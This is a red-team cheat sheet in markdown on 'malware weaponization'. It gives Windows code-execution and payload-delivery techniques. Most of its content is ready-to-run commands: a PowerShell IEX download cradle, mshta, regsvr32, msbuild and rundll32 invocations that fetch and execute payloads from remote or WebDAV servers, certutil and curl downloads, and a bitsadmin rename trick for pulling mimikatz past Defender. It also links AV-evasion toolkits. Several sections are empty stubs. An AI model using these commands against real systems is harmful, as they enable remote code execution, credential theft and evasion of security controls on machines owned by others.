# Malware Weaponization & Development
A curated list of tools and techniques written from experience in red teaming and weaponization of malware used in enterprise environments. 

## Code Execution Methods
### Powershell
Endless methods here, lots of obfuscation techniques, just test and choose one that works in your environment
  * [Infoke-Obfuscation Guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide): Infamous Powershell obfuscator by Daniel Bohannon
  * [Powershell without Powershell.exe](https://medium.com/@Bank_Security/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628)
  * [Powershell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

Basic example to execute in memory:
```
powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('https://Domain.com/Payload.ps1')
```
Powershell from a WebDAV server:
```
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
[PowerLine](https://github.com/fullmetalcache/PowerLine) - Compile EXE then transfer it to victim machine to execute Powershell commands without Powershell.exe.
It has to be compiled with the scripts you wish to load (i.e. PowerUp.ps1, Invoke-Mimikatz.ps1, etc.)
```
PowerLine.exe -ShowScripts
PowerLine.exe PowerUp "Invoke-AllChecks"
```

### Dynamic Data Exchange (DDE)
Macroless payload in Word and Excel
  * Frequently blocked in Word docs within modern Enterprises but not always within Excel files. 
  * [DDE Payloads](https://medium.com/red-team/dde-payloads-16629f4a2fcd): Various delivery methods on Medium blog from 2018 to create DDE paylods in different tool kits
  
### Mshta (HTA)
Microsoft binary to execute HTA files or inline scripts
```
1. mshta vbscript:Close(Execute("GetObject(""script:http://WebServer/payload.sct"")"))
2. mshta http://WebServer/payload.hta
3. mshta \\WebDAVserver\folder\payload.hta
```
  
### Rundll32
Microsoft binary to execute code inside a .DLL file. Custom .DLLs can be written in languages such as Csharp to fully bypass detection. 
(Lobas-Project Rundll32 Methods)[https://lolbas-project.github.io/lolbas/Binaries/Rundll32/]
```
# rundll32 C:\yourfile.dll,EntryPoint 
--> yourfile.dll is your malicious .DLL
--> EntryPoint is the function called within the .DLL
```

### MsBuild
Windows .NET executable for building and executing Csharp project files
Web server hosted to run locally:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Payload.xml
```
WebDAV server hosted to run in memory:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\WebDAVserver\Payload.xml
```

### Regsvr32
Windows command-line tool to register and unregister dll files. Can be used to bypass some controls such as AppLocker
  * [Bypass Application Whitelisting using regsrv32.exe (Multiple Methods)](https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/)

Method 1: Web server delivery
Written on disk in IE local cache
Command to run on target machine:
```
regsvr32 /u /n /s /i:http://yourdomain/payload.sct scrobj.dll
```
Method 2: WebDAV server
Written on disk in WebDAV client local cache
Command to run on target machine:
```
regsvr32 /u /n /s /i:\\webdavserver\tmp\payload.sct scrobj.dll
```

---------------------------------------------------------------
## Payload Downloading and Delivery Methods

[Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

### Powershell

### Curl
Linux and Windows 10 (build #17063 and later) operating systems tool to bypass controls
Reference: https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983
```
curl -o nc.exe https://yourdomain.com/nc.exe
```

### Certutil
Windows built-in binary for downloading remote files, encoding and decoding them. Blocked on recent builds of Windows 10 with Defender.
```
certutil -urlcache -f https://download.sysinternals.com/files/PSTools.env pstools.env
certutil -decode pstools.env pstools.zip
```

### MsBuild with WebDAV

### Bitsadmin
Windows command-line utility for managing BITS jobs and transferring files.
Blocked by modern Windows 10 Defender but can be copied to another EXE to bypass.
Basic example:
```
bitsadmin /transfer job https://Domain.com/Payload.ps1 Payload.ps1
```
Example to bypass Win 10 Defender:
```
copy /Y C:\Windows\System32\bitsadmin.exe %temp%\Update.exe
%temp%\Update.exe /transfer newjob https://Domain.com/mimikatz.exe %temp%\mimikatz.exe
```
PowerShell example:
```
PS# Start-BitsTransfer https://Domain.com/mimikatz.exe %temp%\mimikatz.exe
```

### SLK (Symbolic Link) file

### IQY file / Excel with IQY embedded

### Malicious DLL (Csharp)
Create a custom made Csharp DLL in Visual Studio Code for more custom/granular payloads to bypass AV

---------------------------------------------------------------
## Tool kits
* [Veil Evasion](https://github.com/Veil-Framework/Veil): Generate Metasploit based payloads. Includes payload type and encoding options.
* [Lucky Strike](https://github.com/curi0usJack/luckystrike): PowerShell tool for creating malicious Macro documents. 
* [Shellter](https://www.shellterproject.com/): Automated anti-virus evasion toolkit for payload development.
* [Magic Unicorn](): 

## Red teaming Frameworks
* [Powershell Empire](): 
* [Cobalt Strike](): Red teaming framework of choise for many professionals. Costly but effective. 
* [Covanent](): Open source framework from the makers of Cobalt Strike
* [Metasploit]():

